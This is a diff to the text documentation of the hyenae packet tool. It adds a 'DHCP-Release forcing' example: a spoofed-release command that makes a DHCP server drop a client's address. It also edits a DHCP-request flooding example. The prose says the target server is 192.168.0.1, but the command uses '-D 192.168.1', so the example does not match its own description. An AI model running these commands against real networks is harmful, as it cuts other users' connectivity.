@@ -147,7 +147,16 @@
     available DHCP-Servers on the network.
 
     # hyenae -I 3 -a dhcp-request -s %-0.0.0.0 \
-    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.%%%
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -S %
+
+    5.8 DHCP-Release forcing
+
+    This attack will send a single DHCP-Release packet from a fictional source
+    address to all available DHCP-Servers on the network to have the used
+    IP-Address released by the DHCP-Server that is matching 192.168.0.1.
+
+    # hyenae -I 3 -a dhcp-release -s 11:22:33:44:55:66-192.168.0.2 \
+    # -d ff:ff:ff:ff:ff:ff-255.255.255.255 -D 192.168.1 -c 1
 
 --------------------------------------------------------------------------------
 
